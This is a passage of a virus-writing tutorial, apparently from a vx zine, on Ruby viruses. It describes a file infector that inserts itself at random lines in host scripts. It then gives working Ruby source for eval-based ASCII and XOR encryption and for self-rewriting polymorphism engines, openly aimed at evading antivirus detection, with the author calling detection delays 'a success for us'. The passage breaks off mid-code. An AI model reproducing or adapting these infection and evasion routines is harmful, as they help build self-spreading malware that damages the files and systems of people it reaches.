&nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
cdir.<span style="color:#9900CC;">close</span><br/>
&nbsp;</div>
<p>As I've already written, the virus includes itself anywhere between the code. Therefore it searchs all lines of the host and include itself anywhere between the lines. The infected file could look like that after infection: &lt;l1,l2,l3,l4,l5&gt;&lt;VIRUS&gt;&lt;l6,l7,l8,l9,l10,l11,l12,l13,l14,l15&gt; Next points are more detailed descriptions of the code, how it works:</p>
<ul>
<li>Opens the current file</li>
<li>Reads the filecontent</li>
<li>Searchs the 'SPTH'-string in the file</li>
<li>Read the whole virus</li>
<li>Opens the current directory</li>
<li>Finds infectable files</li>
<li>Reads the whole filecontent</li>
<li>Searchs the 'SPTH'-string, to know if the file is already infected</li>
<li>Gets the number of lines (searchs for chr(10))</li>
<li>Gets a random number between 0 and the number of lines (X)</li>
<li>Gets the code before line X</li>
<li>Adds the viruscode to the code before line X</li>
<li>Adds the rest of the file-content to the code</li>
<li>Writes the code to the file</li>
<li>Closes the current directory</li>
</ul>
<h2>2) Encryption</h2>
<p>To fake AVs one word comes to the story: Encryption. The purpose of encryption is to chiffer the code, that it can not be read in the normal way. A non-encrypted virus is normally quiet easy to analyse and to detect. An encrypted virus is different: The AV researcher first have to find the plain code. And the detection routine has also to emuate the the decrytion routine of the virus. As a result the time of detection increases. And that's a success for us! :)</p>
<h3>a) Virus as ASCII numbers</h3>
<p>This is a very easy and often used way of chiffering script and web-based languages. You change the whole code into the ascii numbers of itself. With a polymorphic engine you can increase the power of this technique very much (you will find that technique above in the next chapter). Just look at the code, and understand, what i mean.</p>
<p><strong>Encryption Example - Type I</strong></p>
<div class="ruby" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color:#CC0066; font-weight:bold;">eval</span><span style="color: black;">&#40;</span><span style="color:#006666;">112</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">114</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">105</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">110</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">116</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">40</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color:#006666;">34</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">72</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">101</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">108</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">108</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">111</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color:#006666;">32</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">118</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">120</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">101</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">114</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">115</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">33</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">34</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">41</span>.<span style="color:#9900CC;">chr</span><span style="color: black;">&#41;</span><br/>
&nbsp;</div>
<p>The code contains one print-command, which writes one short (secret) sentence. As you can see, you can not read the code without playing around with it. The code uses an command called 'eval' to run commands. This is in this chapter our most importend command. Well, I think you know how it works.</p>
<h3>b) Virus as Characters </h3>
<p>The next encryption technique is also very often used in script languages. For instance jackie has done the same thing in JavaScript. I thought it would also be possible in Ruby, I was right. First I've tried to make a polymorphism engine, but it was not possible, because of some special characters, and Ruby can not ignore them. Therefore I had to make it just as simple encryption. The technique works this way: An variable contains the code, XOR'ed with a number (key). Then the decrytion routine gets the real code. After that the real code will be executed (evaluated). Look at the example and try to understand what I mean:</p>
<p><strong>Encryption Example - Type II</strong></p>
<div class="ruby" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">code=<span style="color:#996600;">&quot;üþåâø¤®ÞùîõÓåÿÓïããà¶¥®¥&quot;</span><br/>
i=<span style="color:#006666;">0</span><br/>
newcode=<span style="color:#996600;">&quot;&quot;</span><br/>
<span style="color:#9966CC; font-weight:bold;">while</span> i<span style="color:#006600; font-weight:bold;">&lt;</span>code.<span style="color:#9900CC;">length</span><br/>
&nbsp; nc=<span style="color:#CC0066; font-weight:bold;">eval</span><span style="color: black;">&#40;</span><span style="color:#996600;">&quot;?&quot;</span><span style="color:#006600; font-weight:bold;">+</span>code<span style="color: black;">&#91;</span>i,<span style="color:#006666;">1</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span> ^ <span style="color:#006666;">140</span><br/>
&nbsp; newcode<span style="color:#006600; font-weight:bold;">+</span>=nc.<span style="color:#9900CC;">chr</span><br/>
&nbsp; i<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">1</span><br/>
<span style="color:#9966CC; font-weight:bold;">end</span><br/>
<span style="color:#CC0066; font-weight:bold;">eval</span><span style="color: black;">&#40;</span>newcode<span style="color: black;">&#41;</span><br/>
&nbsp;</div>
<ul>
<li>'code' contains the encrypte (secret :D) message</li>
<li>The while gets every letter in the variable 'code'</li>
<li>nc=decrypted single character's number</li>
<li>newcode=character of the decrypted number</li>
<li>eval(newcode) = evaluates the whole decrypted code</li>
</ul>
<p>There are several other ways to encrypt a Ruby script code, but it's possible to use these techiques as random encryption, therefore I've added it in the next chapter: Polymorphism.</p>
<h2>3) Polymorphism</h2>
<p>This word is very well known, and it's one of the best ways to fake AVs. In this article I wanted to give you all ideas and codes I had about polymorphism. Short after starting to write the article i've recognized that I have alot of ideas, how a Ruby polymorphism could look like. The following codes aren't viruses, but just polymorphism engines. It's quite easy to include them to a virus, therefore I haven't added a infection routine. Well about polymorphism: Poly is a synonym for 'many' and morph means 'changing'. That means, that polymorphism says 'many changes'. The following codes and ideas will tell you, how a polymorphic virus in ruby could work. Just go on reading...</p>
<h3>a) Random encrypter: ASCII Number function</h3>
<p>This technique has it's code transformed into ASCII-numbers with two other values. A function, which gets the 3 values then returns the real number. That means, that the code is build of three values, which together become the real ASCII-number by a decryption function. The following code morphes itself at every generation with this technique:</p>
<p><strong>Polymorphism Example - ASCII Number function</strong></p>
<p><a href="files/vsp20/pe.py">Polymorphism Example - ASCII Number function</a></p>
<p>This is the real polymorphism engine. The encrypted text contains the encrypter. You can not understand the chiffer-text without encrypting it, therefore I've added the unencrypted sample. The explanation follows later on:</p>
<p><strong>Polymorphism Example I - Inside</strong></p>
<div class="ruby" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">i=<span style="color:#006666;">0</span><br/>
newcode=<span style="color:#996600;">&quot;&quot;</span><br/>
<span style="color:#9966CC; font-weight:bold;">while</span> i<span style="color:#006600; font-weight:bold;">&lt;</span>code.<span style="color:#9900CC;">length</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> code<span style="color: black;">&#91;</span>i,<span style="color:#006666;">1</span><span style="color: black;">&#93;</span>==<span style="color:#006666;">10</span>.<span style="color:#9900CC;">chr</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; newcode<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">34</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">92</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;n&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">34</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;+&quot;</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">elsif</span> code<span style="color: black;">&#91;</span>i,<span style="color:#006666;">1</span><span style="color: black;">&#93;</span>==<span style="color:#006666;">32</span>.<span style="color:#9900CC;">chr</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; newcode<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">34</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">92</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;s&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">34</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;+&quot;</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">elsif</span> code<span style="color: black;">&#91;</span>i,<span style="color:#006666;">1</span><span style="color: black;">&#93;</span>==<span style="color:#006666;">92</span>.<span style="color:#9900CC;">chr</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> code<span style="color: black;">&#91;</span>i,<span style="color:#006666;">2</span><span style="color: black;">&#93;</span>==<span style="color:#006666;">92</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;s&quot;</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; newcode<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#996600;">&quot;bs+&quot;</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">else</span><br/>
&nbsp; &nbsp; &nbsp; newcode<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#996600;">&quot;bn+&quot;</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; &nbsp; i<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">1</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">elsif</span> code<span style="color: black;">&#91;</span>i,<span style="color:#006666;">1</span><span style="color: black;">&#93;</span>==<span style="color:#006666;">95</span>.<span style="color:#9900CC;">chr</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; newcode<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#996600;">&quot;mf+&quot;</span><br/>
&nbsp; &nbsp; i<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">7</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">else</span><br/>
&nbsp; &nbsp; b=<span style="color:#CC0066; font-weight:bold;">eval</span><span style="color: black;">&#40;</span><span style="color:#996600;">&quot;?&quot;</span><span style="color:#006600; font-weight:bold;">+</span>code<span style="color: black;">&#91;</span>i,<span style="color:#006666;">1</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; rnb=<span style="color:#CC0066; font-weight:bold;">rand</span><span style="color: black;">&#40;</span><span style="color:#006666;">254</span><span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">1</span><br/>
&nbsp; &nbsp; rnc=<span style="color:#CC0066; font-weight:bold;">rand</span><span style="color: black;">&#40;</span><span style="color:#006666;">3</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> rnc==<span style="color:#006666;">0</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; newcode<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#996600;">&quot;dc(&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#CC0066; font-weight:bold;">String</span><span style="color: black;">&#40;</span>b<span style="color:#006600; font-weight:bold;">-</span>rnb<span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;,&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#CC0066; font-weight:bold;">String</span><span style="color: black;">&#40;</span>rnb<span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;,&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#CC0066; font-weight:bold;">String</span><span style="color: black;">&#40;</span>rnc<span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;)+&quot;</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">elsif</span> rnc==<span style="color:#006666;">1</span><br/>
&nbsp; &nbsp; &nbsp; newcode<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#996600;">&quot;dc(&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#CC0066; font-weight:bold;">String</span><span style="color: black;">&#40;</span>b<span style="color:#006600; font-weight:bold;">+</span>rnb<span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;,&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#CC0066; font-weight:bold;">String</span><span style="color: black;">&#40;</span>rnb<span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;,&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#CC0066; font-weight:bold;">String</span><span style="color: black;">&#40;</span>rnc<span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;)+&quot;</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">else</span> rnc==<span style="color:#006666;">2</span><br/>
&nbsp; &nbsp; &nbsp; newcode<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#996600;">&quot;dc(&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#CC0066; font-weight:bold;">String</span><span style="color: black;">&#40;</span>b<span style="color:#006600; font-weight:bold;">*</span>rnb<span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;,&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#CC0066; font-weight:bold;">String</span><span style="color: black;">&#40;</span>rnb<span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;,&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#CC0066; font-weight:bold;">String</span><span style="color: black;">&#40;</span>rnc<span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;)+&quot;</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; i<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">1</span><br/>
<span style="color:#9966CC; font-weight:bold;">end</span><br/>
newcode=newcode<span style="color: black;">&#91;</span><span style="color:#006666;">0</span>,newcode.<span style="color:#9900CC;">length</span><span style="color:#006600; font-weight:bold;">-</span><span style="color:#006666;">1</span><span style="color: black;">&#93;</span><br/>
m=<span style="color:#CC0066; font-weight:bold;">open</span><span style="color: black;">&#40;</span><span style="color:#0000FF; font-weight:bold;">__FILE__</span><span style="color: black;">&#41;</span><br/>
&nbsp; decen=m.<span style="color:#9900CC;">read</span><span style="color: black;">&#40;</span><span style="color:#006666;">184</span><span style="color: black;">&#41;</span><br/>
m.<span style="color:#9900CC;">close</span><br/>
m=<span style="color:#CC0066; font-weight:bold;">open</span><span style="color: black;">&#40;</span><span style="color:#0000FF; font-weight:bold;">__FILE__</span>,<span style="color:#996600;">&quot;w&quot;</span><span style="color: black;">&#41;</span><br/>
&nbsp; m.<span style="color:#9900CC;">write</span><span style="color: black;">&#40;</span>decen<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;<span style="color:#000099;">\n</span>code=&quot;</span><span style="color:#006600; font-weight:bold;">+</span>newcode<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;<span style="color:#000099;">\n</span>eval(code)&quot;</span><span style="color: black;">&#41;</span><br/>
m.<span style="color:#9900CC;">close</span><br/>
&nbsp;</div>
<p>Now you should understand how it works, if you look at the code. The whole thing works like that:</p>
<ul>
<li>The variable 'code' contains all the encrypted content. One letter is originally a call to the decryption-routine. It contains three values, for decryption. Such a decryption allows 255*3 variant for every character.</li>
<li>After decryting the whole code, three variables (bn, bs, mf) will be defined. They are important, because Ruby can not find the ascii-numbers of 10.chr / 32.chr or can not work with the pre-defined variable "__FILE__". __FILE__ returns the current path and filename. As Ruby is Lunix based, the path uses "/" (slashes) beside of "" (backslashed). There the File class method "basename" helps. File.basename returns the last slash-delimited component of the filename. So we solved the problem with the (back-)slashes.</li>
<li>The decryption routine, which gets the three values returns the real character of the decryted value. The three values: a (the result), b (random number), c (calculation type) A character, for instance 'A' = 65.chr. Let's make it encrypted: dc(20,45,0) means: 20 (a) + (c) 45 (b) = 65, or: dc(13000, 200, 2) means: 13000 (a) / (c) 200 (b) = 65.</li>
<li>After encryption the code will be executed with the command "eval". This evaluates expressions as a Ruby program. </li>
<li>The encryption routine has a while in it to get every single letter of the decrypted variable 'code'.</li>
<li>First it checks, if the string is 10/32/92/95.chr. If so, it will not encrypt it, but use a variable for the code.</li>
<li>b=eval("?"+code[i,1]) - This is maybe the most important command in the whole engine. ?A returns for instance 65. But if a string is "?A", it will not change, so the string has to be evaluated to get the real character number of a letter. code[i,1] is one letter of the current position in the file (from the filepointer).</li>
<li>Next step is to get two random numbers, one between 1-254 (rnb) and one between 0-2 (rnc). 'rnc' is responsible for the calculation type (add, sub, mul), and 'rnb' is the number which will be added/sub'ed/mul'ed with the original character number of the letter. Here the encryted function will be created and added to the 'newcode' variable.</li>
<li>After that the current file will be opened and 184 bytes will be read. These bytes are the decryption engine for the next generation. This decrypter doesn't change because this is just an example of THIS poly engine.</li>
<li>In the end the current file will be opened and the code will be written to it.</li>
</ul>
<h3>b) Code-As-Sting morphing</h3>
<p>As a code could be evaluated as a String, and we could morph a String, and it still has the original content, we could use a String as our code. This time we don't use a decrypting routine but use variables and character-numbers for self-converting it to the old plain text. A shourt explanation is this code-snip:</p>
<div class="ruby" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;code=<span style="color:#996600;">'Code-As-String morphing'</span><br/>
&nbsp;</div>
<p>could also be</p>
<div class="ruby" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ehxx=<span style="color:#996600;">'o'</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;cojf=<span style="color:#996600;">'s'</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;qtze=<span style="color:#996600;">'r'</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;code=<span style="color:#996600;">'C'</span><span style="color:#006600; font-weight:bold;">+</span>ehxx<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">100</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'e'</span><span style="color:#006600; font-weight:bold;">+</span>bs<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'A'</span><span style="color:#006600; font-weight:bold;">+</span>cojf<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>bs<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">83</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'tr'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">105</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">110</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'g'</span><span style="color:#006600; font-weight:bold;">+</span>bs<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'mo'</span><span style="color:#006600; font-weight:bold;">+</span>qtze<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'phing'</span><br/>
&nbsp;</div>
<p>First you should check out the engine's code, and look at the explanation later on. I've added the ready-to-run engine (already encrypted, otherwise it would not work), and the plain text in the encrypted string. First, the whole engine:</p>
<p><strong>Polymorphism Example - Code-As-Sting morphing</strong></p>
<div class="ruby" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">bs=<span style="color:#006666;">32</span>.<span style="color:#9900CC;">chr</span><br/>
bn=<span style="color:#006666;">10</span>.<span style="color:#9900CC;">chr</span><br/>
mf=<span style="color:#CC00FF; font-weight:bold;">File</span>.<span style="color:#9900CC;">basename</span><span style="color: black;">&#40;</span><span style="color:#0000FF; font-weight:bold;">__FILE__</span><span style="color: black;">&#41;</span><br/>
jeol=<span style="color:#996600;">'w'</span><br/>
vljp=<span style="color:#996600;">'e'</span><br/>
pnvj=<span style="color:#996600;">'.'</span><br/>
dzac=<span style="color:#996600;">'&quot;'</span><br/>
okas=<span style="color:#996600;">'m'</span><br/>
vzcu=<span style="color:#996600;">'('</span><br/>
ylwf=<span style="color:#996600;">'m'</span><br/>
wrvn=<span style="color:#996600;">'&quot;'</span><br/>
qhze=<span style="color:#996600;">'c'</span><br/>
syfp=<span style="color:#996600;">'d'</span><br/>
xqfk=<span style="color:#996600;">'.'</span><br/>
ueaz=<span style="color:#996600;">','</span><br/>
ymek=<span style="color:#996600;">'.'</span><br/>
gnzv=<span style="color:#996600;">'i'</span><br/>
sgzr=<span style="color:#996600;">'b'</span><br/>
sgge=<span style="color:#996600;">'+'</span><br/>
pttf=<span style="color:#996600;">'i'</span><br/>
tuuz=<span style="color:#996600;">'c'</span><br/>
kkwl=<span style="color:#996600;">'o'</span><br/>
taot=<span style="color:#996600;">'d'</span><br/>
plbx=<span style="color:#996600;">'i'</span><br/>
ouij=<span style="color:#996600;">'0'</span><br/>
wrat=<span style="color:#996600;">'e'</span><br/>
nixi=<span style="color:#996600;">'+'</span><br/>
covt=<span style="color:#996600;">'&quot;'</span><br/>
nnjw=<span style="color:#996600;">'c'</span><br/>
ifpt=<span style="color:#996600;">'i'</span><br/>
bwiy=<span style="color:#996600;">'e'</span><br/>
jjgv=<span style="color:#996600;">'w'</span><br/>
oheh=<span style="color:#996600;">'d'</span><br/>
gvmz=<span style="color:#996600;">'='</span><br/>
cxpe=<span style="color:#996600;">'3'</span><br/>
ttjy=<span style="color:#996600;">'r'</span><br/>
njpx=<span style="color:#996600;">'+'</span><br/>
vkjp=<span style="color:#996600;">'.'</span><br/>
asfu=<span style="color:#996600;">'s'</span><br/>
pran=<span style="color:#996600;">'f'</span><br/>
eoik=<span style="color:#996600;">'o'</span><br/>
bvle=<span style="color:#996600;">'['</span><br/>
uvvx=<span style="color:#996600;">'='</span><br/>
uwbo=<span style="color:#996600;">'o'</span><br/>
mpta=<span style="color:#996600;">','</span><br/>
pjor=<span style="color:#996600;">'2'</span><br/>
havc=<span style="color:#996600;">'9'</span><br/>
rhet=<span style="color:#996600;">'t'</span><br/>
xdec=<span style="color:#996600;">'&quot;'</span><br/>
txwe=<span style="color:#996600;">'3'</span><br/>
ndkt=<span style="color:#996600;">'3'</span><br/>
lgtf=<span style="color:#996600;">'&quot;'</span><br/>
inuq=<span style="color:#996600;">'+'</span><br/>
uguw=<span style="color:#996600;">','</span><br/>
saba=<span style="color:#996600;">'.'</span><br/>
emnf=<span style="color:#996600;">'.'</span><br/>
phdj=<span style="color:#996600;">'3'</span><br/>
ucos=<span style="color:#996600;">'c'</span><br/>
geul=<span style="color:#996600;">'+'</span><br/>
xayn=<span style="color:#996600;">'f'</span><br/>
ekau=<span style="color:#996600;">'7'</span><br/>
iwok=<span style="color:#996600;">')'</span><br/>
rhom=<span style="color:#996600;">'9'</span><br/>
wxrt=<span style="color:#996600;">'7'</span><br/>
qcbu=<span style="color:#996600;">'c'</span><br/>
qnke=<span style="color:#996600;">'d'</span><br/>
zcas=<span style="color:#996600;">'('</span><br/>
putq=<span style="color:#996600;">')'</span><br/>
bcug=<span style="color:#996600;">'9'</span><br/>
xygd=<span style="color:#996600;">'+'</span><br/>
bhcw=<span style="color:#996600;">'a'</span><br/>
dbjs=<span style="color:#996600;">'d'</span><br/>
ezjl=<span style="color:#996600;">'('</span><br/>
ttul=<span style="color:#996600;">'9'</span><br/>
jooo=<span style="color:#996600;">')'</span><br/>
eslo=<span style="color:#996600;">'r'</span><br/>
dehb=<span style="color:#996600;">'i'</span><br/>
yrkk=<span style="color:#996600;">'t'</span><br/>
ygfw=<span style="color:#996600;">'&quot;'</span><br/>
uaau=<span style="color:#996600;">'1'</span><br/>
jxec=<span style="color:#996600;">'9'</span><br/>
tzqa=<span style="color:#996600;">'r'</span><br/>
etto=<span style="color:#996600;">'3'</span><br/>
keyq=<span style="color:#996600;">'r'</span><br/>
ajoo=<span style="color:#996600;">'l'</span><br/>
edvw=<span style="color:#996600;">'s'</span><br/>
jwlo=<span style="color:#996600;">'o'</span><br/>
syln=<span style="color:#996600;">'e'</span><br/>
yvaq=<span style="color:#996600;">'3'</span><br/>
bfuu=<span style="color:#996600;">'c'</span><br/>
symo=<span style="color:#996600;">'&quot;'</span><br/>
ngeb=<span style="color:#996600;">'&quot;'</span><br/>
ybto=<span style="color:#996600;">'g'</span><br/>
acco=<span style="color:#996600;">'v'</span><br/>
efex=<span style="color:#996600;">'+'</span><br/>
xrtx=<span style="color:#996600;">'d'</span><br/>
lrdh=<span style="color:#996600;">'&quot;'</span><br/>
smyz=<span style="color:#996600;">'c'</span><br/>
rbkp=<span style="color:#996600;">'9'</span><br/>
myvh=<span style="color:#996600;">'c'</span><br/>
rxug=<span style="color:#996600;">'e'</span><br/>
xins=<span style="color:#996600;">'n'</span><br/>
mpwk=<span style="color:#996600;">'d'</span><br/>
tyrr=<span style="color:#996600;">'w'</span><br/>
yzlc=<span style="color:#996600;">'o'</span><br/>
chtw=<span style="color:#996600;">'e'</span><br/>
code=<span style="color:#996600;">'i=0'</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'ne'</span><span style="color:#006600; font-weight:bold;">+</span>jeol<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'c'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">111</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'d'</span><span style="color:#006600; font-weight:bold;">+</span>vljp<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'=3'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">57</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'.'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">99</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'hr'</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">109</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'f=o'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">112</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">101</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'n(&quot;code'</span><span style="color:#006600; font-weight:bold;">+</span>pnvj<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'rb'</span><span style="color:#006600; font-weight:bold;">+</span>dzac<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">')'</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">99</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span 